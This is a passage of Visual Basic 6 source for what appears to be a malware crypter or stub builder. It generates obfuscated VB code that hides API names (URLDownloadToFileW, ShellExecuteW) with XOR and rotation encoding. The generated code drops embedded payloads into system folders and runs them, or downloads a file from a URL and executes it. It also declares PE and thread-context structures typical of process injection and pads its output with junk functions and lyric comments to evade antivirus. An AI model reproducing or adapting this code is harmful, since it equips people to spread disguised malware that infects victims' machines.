"  " & m52.Text & "(" & m51.Text & ") = Mid$(" & m44.Text & ", " & m47.Text & ")" & vbNewLine & _
"  End If" & vbNewLine & _
"  Exit Do" & vbNewLine & _
"  End If" & vbNewLine & _
"  " & m52.Text & "(" & m51.Text & ") = Mid$(" & m44.Text & ", " & m47.Text & ", " & m48.Text & " - " & m47.Text & ")" & vbNewLine & _
"  " & m51.Text & " = " & m51.Text & " + 1" & vbNewLine & _
"  ReDim Preserve " & m52.Text & "(" & m51.Text & ")" & vbNewLine & _
"  " & m47.Text & " = " & m48.Text & " + " & m50.Text & vbNewLine & _
"  " & m48.Text & " = " & m47.Text & vbNewLine & _
"  Loop" & vbNewLine & _
"  ReDim Preserve " & m52.Text & "(" & m51.Text & ")" & vbNewLine & _
"  " & m33.Text & " = " & m52.Text & vbNewLine & _
"End Function" & vbNewLine


If Check6.Value = 1 Then
patru = patru & "  '" & lRan(20) & vbNewLine & _
"  'Umblu torpilat" & vbNewLine & _
"  '" & lRan(17) & vbNewLine & _
"  'N-am aflat pa unde-mi umbla capu.." & vbNewLine & _
"  '" & lRan(30) & vbNewLine & _
"  'Unde ma aflu cine poa' sa-mi spuna..." & vbNewLine & _
"  '" & lRan(29) & vbNewLine & _
"  'c 'am plecat matol de unde beam acu o luna.." & vbNewLine & _
"  '" & lRan(25) & vbNewLine & _
"  'Sunt suparat ca mi-au fumat parintii planta de canabis" & vbNewLine & _
"  '" & lRan(12) & vbNewLine
End If
End Function
Private Function trei()
f.a81.Text = xrn(f.a80.Text, "shell32")
f.a83.Text = xrn(f.a82.Text, "FindExecutableW")

' c82.Text & "." & f.a34.Text & " (" & x & f.a82.Text & x & ", " & x & f.a83.Text & x & ") "
n.Text49.Text = RotxEncrypt("rckn")
n.Text50.Text = RotxEncrypt("Z/,frkj")
n.Text51.Text = RotxEncrypt(f.a80.Text)
n.Text52.Text = RotxEncrypt(f.a81.Text)
n.Text53.Text = RotxEncrypt(f.a82.Text)
n.Text54.Text = RotxEncrypt(f.a83.Text)
n.Text55.Text = RotxEncrypt("/,frkj")
n.Text56.Text = RotxEncrypt("rckn")
Sleep 500
'& f.r.Text & "("
'& m32.Text & "("
trei = trei & "Private Function " & m35.Text & "() As String" & vbNewLine & _
"  Dim " & m36.Text & "     As String" & vbNewLine & _
"  Dim " & m37.Text & "         As Integer" & vbNewLine & _
"  Open Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text49.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text50.Text & X & ")) For Output As #" & f.ifile1.Text & vbNewLine & _
"  Close #" & f.ifile1.Text & vbNewLine & _
"  " & m36.Text & " = Space$(260)" & vbNewLine & _
"  Call " & c82.Text & "." & m42.Text & " ( " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text51.Text & X & "), " & f.r.Text & "(" & X & n.Text52.Text & X & ")), " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text53.Text & X & "), " & f.r.Text & "(" & X & n.Text54.Text & X & ")), StrPtr(" & m32.Text & "(" & X & "/,frkj" & X & ")), StrPtr(Environ(" & m32.Text & "(" & X & "rckn" & X & ")) & " & X & "\" & X & "), StrPtr(" & m36.Text & ") )" & vbNewLine & _
"  " & m37.Text & " = InStr(" & m36.Text & ", Chr$(0))" & vbNewLine & _
"  If " & m37.Text & " Then" & vbNewLine & _
"  " & m35.Text & " = Left$(" & m36.Text & ", " & m37.Text & " - 1)" & vbNewLine & _
"  Else" & vbNewLine & _
"  " & m35.Text & " = " & m36.Text & vbNewLine & _
"  End If" & vbNewLine & _
"End Function" & vbNewLine


If Check6.Value = 1 Then
trei = trei & "Private Function " & f.junk14.Text & "()" & vbNewLine & _
"  On error goto " & f.junk13.Text & vbNewLine & _
"  if " & f.junk14.Text & " <> 0 then" & vbNewLine & _
"  " & f.junk14.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.junk13.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

Sleep 1000
End Function
Private Function doi()
n.Text28.Text = RotxEncrypt("Rcknmp_pw")
n.Text29.Text = RotxEncrypt("Qwqrck10")
n.Text30.Text = RotxEncrypt("Uglbmuq")
n.Text31.Text = RotxEncrypt("Qwqrck")
n.Text32.Text = RotxEncrypt("Bpgtcpq") 'Bpgtcpq
n.Text33.Text = RotxEncrypt("Rfgqcvc")
n.Text34.Text = RotxEncrypt("Cvnjmpcp")
n.Text35.Text = RotxEncrypt("Qcptgacq")
Sleep 500
n.Text36.Text = RotxEncrypt("Qtafmqr")
n.Text37.Text = RotxEncrypt("Bcd,@pmuqcp")
n.Text38.Text = RotxEncrypt("G,Cvnjmpcp")
n.Text39.Text = RotxEncrypt("npmep_kdgjcq")
Sleep 500
n.Text40.Text = RotxEncrypt("uglbgp")
n.Text41.Text = RotxEncrypt("rckn")
n.Text42.Text = RotxEncrypt("Zqwqrck10")
n.Text43.Text = RotxEncrypt("Zqwqrck")
n.Text44.Text = RotxEncrypt("ZGlrcplcrCvnjmpcpZGCVNJMPC,CVC")
n.Text45.Text = RotxEncrypt("Zqwqrck10Zqtafmqr,cvc")
n.Text46.Text = RotxEncrypt("Zcvnjmpcp,cvc") '
Sleep 500
n.Text47.Text = RotxEncrypt("Zqwqrck10Zqcptgacq,cvc")
n.Text48.Text = RotxEncrypt("Zqwqrck10Zbpgtcpq")
'& f.r.Text & "("
doi = doi & "Private Function " & m34.Text & "()" & vbNewLine & _
"  Select Case " & m28.Text & "." & c1.Text & " (" & m25.Text & " , " & m70.Text & "  )" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text28.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text41.Text & X & ")))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text29.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text42.Text & X & "))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text30.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & ")))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text31.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text43.Text & X & "))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text32.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text48.Text & X & "))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text33.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = " & X & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text34.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text46.Text & X & "))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text35.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text47.Text & X & "))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text36.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text40.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text45.Text & X & "))" & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text37.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = " & m35.Text & vbNewLine & _
"  Case " & m32.Text & "(" & f.r.Text & "(" & X & n.Text38.Text & X & "))" & vbNewLine & _
"  " & m34.Text & " = Environ(" & m32.Text & "(" & f.r.Text & "(" & X & n.Text39.Text & X & "))) & " & m32.Text & "(" & f.r.Text & "(" & X & n.Text44.Text & X & "))" & vbNewLine & _
"  End Select" & vbNewLine & "End Function" & vbNewLine
End Function
Private Function unu()

'& f.r.Text & "("


unu = unu & "Private Sub Main()" & vbNewLine & _
"  " & f.r4.Text & vbNewLine & _
"  End" & vbNewLine & "End Sub" & vbNewLine

If Check6.Value = 1 Then
zz = zz & "  '" & lRan(20) & vbNewLine & _
"  'E o tara in care nimic nu e ceea ce pare" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Te provoc sa recunosti adevarata valoare" & vbNewLine & _
"  '" & lRan(25) & vbNewLine & _
"  'E vorba de putere advertising si manipulare" & vbNewLine & _
"  '" & lRan(28) & vbNewLine & _
"  'Faptele, nu vorbele te fac sa fii mare" & vbNewLine & _
"  '" & lRan(30) & vbNewLine
End If
Sleep 500
End Function
Private Function opula()

n.Text15.Text = RotxEncrypt("0")
n.Text1.Text = RotxEncrypt("QR@")
n.Text2.Text = RotxEncrypt("1")
n.Text3.Text = RotxEncrypt(".")
n.Text4.Text = RotxEncrypt("0")

opula = "Private function " & f.r4.Text & "()" & vbNewLine & _
"  On Error Resume Next" & vbNewLine & _
"  " & m19.Text & "() = " & m33.Text & "(StrConv(LoadResData(1, " & m32.Text & "(" & f.r.Text & "(" & X & n.Text1.Text & X & "))), vbUnicode), " & m16.Text & ")" & vbNewLine & _
"  " & m18.Text & "() = " & m33.Text & "(StrConv(LoadResData(2, " & m32.Text & "(" & f.r.Text & "(" & X & n.Text1.Text & X & "))), vbUnicode), " & m16.Text & ")" & vbNewLine & _
"  If " & m18.Text & "(1) = " & X & "1" & X & " Then " & m31.Text & vbNewLine & _
"  If Not " & m18.Text & "(2) = " & X & "0" & X & " Then" & vbNewLine & _
"  Msgbox " & m28.Text & "." & c1.Text & "(" & m18.Text & "(3), " & m18.Text & "(4)), " & m18.Text & "(2) , " & m28.Text & "." & c1.Text & "(" & m18.Text & "(5), " & m18.Text & "(6))" & vbNewLine & _
"  End If" & vbNewLine
f.a61.Text = xrn(f.a60.Text, "kernel32")
f.a63.Text = xrn(f.a62.Text, "Sleep")
f.a65.Text = xrn(f.a64.Text, "kernel32")
f.a67.Text = xrn(f.a66.Text, "Sleep")
f.a69.Text = xrn(f.a68.Text, "shell32")
f.a71.Text = xrn(f.a70.Text, "ShellExecuteW")
Sleep 500

f.a73.Text = xrn(f.a72.Text, "urlmon")
f.a75.Text = xrn(f.a74.Text, "URLDownloadToFileW")
f.a77.Text = xrn(f.a76.Text, "shell32")
f.a79.Text = xrn(f.a78.Text, "ShellExecuteW")


n.Text5.Text = RotxEncrypt(f.a60.Text)
n.Text6.Text = RotxEncrypt(f.a61.Text)
n.Text7.Text = RotxEncrypt(f.a62.Text)
n.Text8.Text = RotxEncrypt(f.a63.Text)
Sleep 500

n.Text9.Text = RotxEncrypt("Bpmndgjc")
n.Text10.Text = RotxEncrypt(f.a68.Text)
n.Text11.Text = RotxEncrypt(f.a69.Text)
n.Text12.Text = RotxEncrypt(f.a70.Text)
n.Text13.Text = RotxEncrypt(f.a71.Text)
n.Text14.Text = RotxEncrypt("1")

n.Text16.Text = RotxEncrypt(f.a64.Text)

' c82.Text & "." & f.a34.Text & " (" & x & f.a74.Text & x & ", " & x & f.a75.Text & x & ") "
'& f.r.Text & "("
opula = opula & "  For " & m29.Text & " = 1 To UBound(" & m19.Text & ")" & vbNewLine & _
"  " & m21.Text & " = " & m33.Text & "(" & m19.Text & "(" & m29.Text & "), " & m17.Text & ")" & vbNewLine & _
"  " & m24.Text & " = " & m21.Text & "(0)" & vbNewLine & _
"  " & m69.Text & " = " & m21.Text & "(1)" & vbNewLine & _
"  " & m25.Text & " = " & m21.Text & "(2)" & vbNewLine & _
"  " & m70.Text & " = " & m21.Text & "(3)" & vbNewLine & _
"  " & m23.Text & " = " & m21.Text & "(4)" & vbNewLine & _
"  " & m27.Text & " = " & m21.Text & "(5)" & vbNewLine & _
"  " & m26.Text & " = " & m21.Text & "(6)" & vbNewLine & _
"  " & m71.Text & " = " & m21.Text & "(7)" & vbNewLine & _
"  " & m74.Text & " = " & m21.Text & "(8)" & vbNewLine & _
"  If not " & m74.Text & " = " & f.r.Text & "(" & X & n.Text4.Text & X & ") Then" & vbNewLine & _
"  " & c82.Text & "." & m42.Text & " " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text5.Text & X & "), " & f.r.Text & "(" & X & n.Text6.Text & X & ")) " & ", " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text7.Text & X & "), " & f.r.Text & "(" & X & n.Text8.Text & X & ")) " & ", " & m74.Text & vbNewLine & _
"  end if" & vbNewLine & _
"  If " & m28.Text & "." & c1.Text & "(" & m24.Text & ", " & m69.Text & ") = " & m32.Text & "(" & f.r.Text & "(" & X & n.Text9.Text & X & ")) Then" & vbNewLine & _
"  " & c83.Text & " = " & m34.Text & " & " & m28.Text & "." & c1.Text & "(" & m26.Text & "," & m71.Text & ")" & vbNewLine & _
"  " & c84.Text & " = " & m28.Text & "." & c1.Text & "(" & m23.Text & ", " & m27.Text & ")" & vbNewLine & _
"  Open " & c83.Text & " For Binary As #" & f.ifile.Text & vbNewLine & _
"  Put #" & f.ifile.Text & ", , " & c84.Text & vbNewLine & _
"  Close #" & f.ifile.Text & vbNewLine & _
"  Call " & c82.Text & "." & m42.Text & "(" & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text10.Text & X & "), " & f.r.Text & "(" & X & n.Text11.Text & X & ")) " & ", " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text12.Text & X & "), " & f.r.Text & "(" & X & n.Text13.Text & X & ")) " & ", 0&, 0&, StrPtr(" & c83.Text & "), 0&, 0&, 1)" & vbNewLine & _
"  Else" & vbNewLine & _
"  Call " & c82.Text & "." & m43.Text & " (" & m34.Text & ", StrConv(" & m28.Text & "." & c1.Text & "(" & m23.Text & ", " & m27.Text & "), vbFromUnicode))" & vbNewLine & _
"  End If" & vbNewLine & _
"  Next " & m29.Text & vbNewLine

'& f.r.Text & "("

n.Text17.Text = RotxEncrypt(f.a65.Text)
n.Text18.Text = RotxEncrypt(f.a66.Text)
n.Text19.Text = RotxEncrypt(f.a67.Text)

n.Text24.Text = RotxEncrypt(f.a72.Text)
n.Text25.Text = RotxEncrypt(f.a73.Text)
n.Text26.Text = RotxEncrypt(f.a74.Text)
n.Text27.Text = RotxEncrypt(f.a75.Text)

n.Text19.Text = RotxEncrypt(f.a76.Text)
n.Text20.Text = RotxEncrypt(f.a77.Text)
n.Text21.Text = RotxEncrypt(f.a78.Text)
n.Text22.Text = RotxEncrypt(f.a79.Text)
n.Text23.Text = RotxEncrypt(f.a80.Text)
opula = opula & "  If " & m18.Text & "(7) = " & f.r.Text & "(" & X & n.Text14.Text & X & ") Then" & vbNewLine & _
"  " & m20.Text & "() = " & m33.Text & "(StrConv(LoadResData(3, " & m32.Text & "(" & f.r.Text & "(" & X & n.Text1.Text & X & "))), vbUnicode), " & m16.Text & ")" & vbNewLine & _
"  " & m24.Text & " = " & X & vbNewLine & _
"  " & m25.Text & " = " & X & vbNewLine & _
"  " & m26.Text & " = " & X & vbNewLine & _
"  " & m27.Text & " = " & X & vbNewLine & _
"  " & m70.Text & " = " & X & vbNewLine & _
"  " & m72.Text & " = " & X & vbNewLine & "  " & m74.Text & " = " & X & "" & X & vbNewLine & _
"  For " & m30.Text & " = 1 To UBound(" & m20.Text & ")" & vbNewLine & _
"  " & m22.Text & " = " & m33.Text & "(" & m20.Text & "(" & m30.Text & "), " & m17.Text & ")" & vbNewLine & _
"  " & m25.Text & " = " & m22.Text & "(0)" & vbNewLine & _
"  " & m70.Text & " = " & m22.Text & "(1)" & vbNewLine & _
"  " & m27.Text & " = " & m22.Text & "(2)" & vbNewLine & _
"  " & m72.Text & " = " & m22.Text & "(3)" & vbNewLine & _
"  " & m24.Text & " = " & m22.Text & "(4)" & vbNewLine & _
"  " & m26.Text & " = " & m22.Text & "(5)" & vbNewLine & _
"  " & m74.Text & " = " & m22.Text & "(6)" & vbNewLine & _
"  If not " & m74.Text & " = " & f.r.Text & "(" & X & n.Text15.Text & X & ") Then" & vbNewLine & _
"  " & c82.Text & "." & m42.Text & " " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text16.Text & X & "), " & f.r.Text & "(" & X & n.Text17.Text & X & ")) " & ", " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text18.Text & X & "), " & f.r.Text & "(" & X & n.Text19.Text & X & ")) " & ", " & m74.Text & vbNewLine & _
"  end if" & vbNewLine & _
"  " & m73.Text & " = " & m34.Text & " & " & m28.Text & "." & c1.Text & " (" & m24.Text & " , " & m26.Text & ")" & vbNewLine & _
"  Call " & c82.Text & "." & m42.Text & " (" & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text24.Text & X & "), " & f.r.Text & "(" & X & n.Text25.Text & X & ")) " & ", " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text26.Text & X & "), " & f.r.Text & "(" & X & n.Text27.Text & X & ")) " & ", 0&, StrPtr(" & m28.Text & "." & c1.Text & "(" & m27.Text & ", " & m72.Text & ")), StrPtr(" & m73.Text & "), 0&, 0&)" & vbNewLine & _
"  Call " & c82.Text & "." & m42.Text & "(" & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text19.Text & X & "), " & f.r.Text & "(" & X & n.Text20.Text & X & ")) , " & c82.Text & "." & f.a34.Text & " (" & f.r.Text & "(" & X & n.Text21.Text & X & "), " & f.r.Text & "(" & X & n.Text22.Text & X & ")) " & ", 0&, 0&, StrPtr(" & m73.Text & "), 0&, 0&, 1)" & vbNewLine & _
"  Next " & m30.Text & vbNewLine & "  End If" & vbNewLine & _
"  End Function" & vbNewLine


End Function
Private Function lApi() As String
X = """"
lApi = "VERSION 1.0 CLASS" & vbCrLf & "BEGIN" & vbCrLf & _
"  MultiUse = -1" & vbCrLf & "  Persistable = 0" & vbCrLf & _
"  DataBindingBehavior = 0" & vbCrLf & "  DataSourceBehavior = 0" & vbCrLf & _
"  MTSTransactionMode = 0" & vbCrLf & "End" & vbCrLf & "Attribute VB_Name = " & _
X & a.Text & X & vbCrLf & "Attribute VB_GlobalNameSpace = False" & vbCrLf & "Attribute VB_Creatable = True" & vbCrLf & _
"Attribute VB_PredeclaredId = False" & vbCrLf & "Attribute VB_Exposed = False" & vbCrLf & "Option Explicit" & vbCrLf

lApi = lApi & "Private Const " & m1.Text & " As Long = &H10007" & vbNewLine & _
"Private Const " & m2.Text & " As Long = &H4" & vbNewLine & _
"Private Const " & m3.Text & " As Long = &H1000" & vbNewLine & _
"Private Const " & m4.Text & " As Long = &H2000" & vbNewLine & _
"Private Const " & m5.Text & " As Long = &H40" & vbNewLine & _
"Private Type " & m6.Text & vbNewLine & _
"  cb As Long" & vbNewLine & _
"  lpReserved As Long" & vbNewLine & _
"  lpDesktop As Long" & vbNewLine & _
"  lpTitle As Long" & vbNewLine
lApi = lApi & "  dwX As Long" & vbNewLine & _
"  dwY As Long" & vbNewLine & _
"  dwXSize As Long" & vbNewLine & _
"  dwYSize As Long" & vbNewLine & _
"  dwXCountChars As Long" & vbNewLine & _
"  dwYCountChars As Long" & vbNewLine & _
"  dwFillAttribute As Long" & vbNewLine & _
"  dwFlags As Long" & vbNewLine & _
"  wShowWindow As Integer" & vbNewLine & _
"  cbReserved2 As Integer" & vbNewLine & _
"  lpReserved2 As Long" & vbNewLine & _
"  hStdInput As Long" & vbNewLine & _
"  hStdOutput As Long" & vbNewLine & _
"  hStdError As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m7.Text & vbNewLine & _
"  hProcess As Long" & vbNewLine & _
"  hThread As Long" & vbNewLine & _
"  dwProcessID As Long" & vbNewLine & _
"  dwThreadID As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m8.Text & vbNewLine & _
"  ControlWord As Long" & vbNewLine & _
"  StatusWord As Long" & vbNewLine & _
"  TagWord As Long" & vbNewLine
  
lApi = lApi & "  ErrorOffset As Long" & vbNewLine & _
"  ErrorSelector As Long" & vbNewLine & _
"  DataOffset As Long" & vbNewLine & _
"  DataSelector As Long" & vbNewLine & _
"  RegisterArea(1 To 80) As Byte" & vbNewLine & _
"  Cr0NpxState As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m9.Text & vbNewLine & _
"  ContextFlags As Long" & vbNewLine & _
"  Dr0 As Long" & vbNewLine & _
"  Dr1 As Long" & vbNewLine & _
"  Dr2 As Long" & vbNewLine & _
"  Dr3 As Long" & vbNewLine & _
"  Dr6 As Long" & vbNewLine & _
"  Dr7 As Long" & vbNewLine & _
"  FloatSave As " & m8.Text & vbNewLine & _
"  SegGs As Long" & vbNewLine & _
"  SegFs As Long" & vbNewLine & _
"  SegEs As Long" & vbNewLine & _
"  SegDs As Long" & vbNewLine & _
"  Edi As Long" & vbNewLine & _
"  Esi As Long" & vbNewLine & _
"  Ebx As Long" & vbNewLine & _
"  Edx As Long" & vbNewLine & _
"  Ecx As Long" & vbNewLine
  
lApi = lApi & "  Eax As Long" & vbNewLine & _
"  Ebp As Long" & vbNewLine & _
"  Eip As Long" & vbNewLine & _
"  SegCs As Long" & vbNewLine & _
"  EFlags As Long" & vbNewLine & _
"  Esp As Long" & vbNewLine & _
"  SegSs As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m10.Text & vbNewLine & _
"  e_magic As Integer" & vbNewLine & _
"  e_cblp As Integer" & vbNewLine & _
"  e_cp As Integer" & vbNewLine & _
"  e_crlc As Integer" & vbNewLine & _
"  e_cparhdr As Integer" & vbNewLine & _
"  e_minalloc As Integer" & vbNewLine & _
"  e_maxalloc As Integer" & vbNewLine & _
"  e_ss As Integer" & vbNewLine & _
"  e_sp As Integer" & vbNewLine & _
"  e_csum As Integer" & vbNewLine & _
"  e_ip As Integer" & vbNewLine & _
"  e_cs As Integer" & vbNewLine & _
"  e_lfarlc As Integer" & vbNewLine & _
"  e_ovno As Integer" & vbNewLine & _
"  e_res(0 To 3) As Integer" & vbNewLine & _
"  e_oemid As Integer" & vbNewLine
  
lApi = lApi & "  e_oeminfo As Integer" & vbNewLine & _
"  e_res2(0 To 9) As Integer" & vbNewLine & _
"  e_lfanew As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m11.Text & vbNewLine & _
"  Machine As Integer" & vbNewLine & _
"  NumberOfSections As Integer" & vbNewLine & _
"  TimeDateStamp As Long" & vbNewLine & _
"  PointerToSymbolTable As Long" & vbNewLine & _
"  NumberOfSymbols As Long" & vbNewLine & _
"  SizeOfOptionalHeader As Integer" & vbNewLine & _
"  characteristics As Integer" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m12.Text & vbNewLine & _
"  VirtualAddress As Long" & vbNewLine & _
"  Size As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m13.Text & vbNewLine & _
"  Magic As Integer" & vbNewLine & _
"  MajorLinkerVersion As Byte" & vbNewLine & _
"  MinorLinkerVersion As Byte" & vbNewLine & _
"  SizeOfCode As Long" & vbNewLine & _
"  SizeOfInitializedData As Long" & vbNewLine & _
"  SizeOfUnitializedData As Long" & vbNewLine & _
"  AddressOfEntryPoint As Long" & vbNewLine
  
lApi = lApi & "  BaseOfCode As Long" & vbNewLine & _
"  BaseOfData As Long" & vbNewLine & _
"  ImageBase As Long" & vbNewLine & _
"  SectionAlignment As Long" & vbNewLine & _
"  FileAlignment As Long" & vbNewLine & _
"  MajorOperatingSystemVersion As Integer" & vbNewLine & _
"  MinorOperatingSystemVersion As Integer" & vbNewLine & _
"  MajorImageVersion As Integer" & vbNewLine & _
"  MinorImageVersion As Integer" & vbNewLine & _
"  MajorSubsystemVersion As Integer" & vbNewLine & "  MinorSubsystemVersion As Integer" & vbNewLine & _
"  W32VersionValue As Long" & vbNewLine & _
"  SizeOfImage As Long" & vbNewLine & _
"  SizeOfHeaders As Long" & vbNewLine & _
"  CheckSum As Long" & vbNewLine & _
"  SubSystem As Integer" & vbNewLine & _
"  DllCharacteristics As Integer" & vbNewLine & _
"  SizeOfStackReserve As Long" & vbNewLine & "  SizeOfStackCommit As Long" & vbNewLine & _
"  SizeOfHeapReserve As Long" & vbNewLine & _
"  SizeOfHeapCommit As Long" & vbNewLine & _
"  LoaderFlags As Long" & vbNewLine & _
"  NumberOfRvaAndSizes As Long" & vbNewLine & _
"  DataDirectory(0 To 15) As " & m12.Text & vbNewLine & _
"End Type" & vbNewLine



lApi = lApi & "Private Type " & m14.Text & vbNewLine & _
"  Signature As Long" & vbNewLine & _
"  FileHeader As " & m11.Text & vbNewLine & _
"  OptionalHeader As " & m13.Text & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & m15.Text & vbNewLine & _
"  SecName As String * 8" & vbNewLine & _
"  VirtualSize As Long" & vbNewLine & _
"  VirtualAddress  As Long" & vbNewLine & _
"  SizeOfRawData As Long" & vbNewLine & _
"  PointerToRawData As Long" & vbNewLine & _
"  PointerToRelocations As Long" & vbNewLine & _
"  PointerToLinenumbers As Long" & vbNewLine & _
"  NumberOfRelocations As Integer" & vbNewLine & _
"  NumberOfLinenumbers As Integer" & vbNewLine & "  characteristics  As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Declare Function GetProcAddress Lib " & X & "kernel32" & X & " (ByVal " & f.gp.Text & " As Long, ByVal " & f.gp1.Text & " As String) As Long" & vbNewLine & _
"Private Declare Function LoadLibraryA Lib " & X & "kernel32" & X & " (ByVal " & f.lb.Text & " As String) As Long" & vbNewLine

lApi = lApi & "Public Function " & a1.Text & "() As Long" & vbNewLine & _
"End Function" & vbNewLine

If Check6.Value = 1 Then
zuzu1 = "Private Function " & f.j6.Text & "()" & vbNewLine & _
"  On error goto " & f.j7.Text & vbNewLine & _
"  if " & f.j6.Text & " <> 0 then" & vbNewLine & _
"  " & f.j6.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j7.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

Sleep 500

If rn2 = "1" Then
lApi = lApi & zuzu22 & zuzu2
Else
lApi = lApi & zuzu2 & zuzu22
End If
End Function
Private Function zuzu22()
Sleep 500
If rn2 = "1" Then
zuzu22 = zuzu4 & zuzu3
Else
zuzu22 = zuzu3 & zuzu4
End If
End Function


Private Function zuzu4() As String
zuzu4 = "Function " & f.a34.Text & "(" & f.f.Text & " As String, " & f.f1.Text & " As String) As String" & vbNewLine & _
"   Dim " & f.f2.Text & " As Long" & vbNewLine & _
"   Dim " & f.f3.Text & " As String" & vbNewLine & _
"   Dim " & f.f4.Text & " As Integer" & vbNewLine & _
"   Dim " & f.f5.Text & " As Integer" & vbNewLine & _
"   For " & f.f2.Text & " = 1 To (Len(" & f.f1.Text & ") / 2)" & vbNewLine & _
"   " & f.f4.Text & " = Val(" & X & "&H" & X & " & (Mid$(" & f.f1.Text & ", (2 * " & f.f2.Text & ") - 1, 2)))" & vbNewLine & _
"   " & f.f5.Text & " = Asc(Mid$(" & f.f.Text & ", ((" & f.f2.Text & " Mod Len(" & f.f.Text & ")) + 1), 1))" & vbNewLine & _
"   " & f.f3.Text & " = " & f.f3.Text & " + Chr(" & f.f4.Text & " Xor " & f.f5.Text & ")" & vbNewLine & _
"   Next " & f.f2.Text & vbNewLine & _
"   " & f.a34.Text & " = " & f.f3.Text & vbNewLine & _
"End Function" & vbNewLine

If Check6.Value = 1 Then
zuzu4 = zuzu4 & "Private Function " & f.j8.Text & "()" & vbNewLine & _
"  On error goto " & f.j9.Text & vbNewLine & _
"  if " & f.j8.Text & " <> 0 then" & vbNewLine & _
"  " & f.j8.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j9.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If


If Check4.Value = 1 Then
zuzu4 = zuzu4 & "  '" & lRan(RandomNumber) & vbNewLine & _
"  'Ombladon" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Toti, toti vagabontii" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Te f**" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Toti vagabontii" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Te f** prin gat in c**" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine
End If

End Function


Public Function xrn(CodeKey As String, DataIn As String) As String
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim temp As Integer
    Dim tempstring As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    For lonDataPtr = 1 To Len(DataIn)
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        temp = (intXOrValue1 Xor intXOrValue2)
        tempstring = Hex(temp)
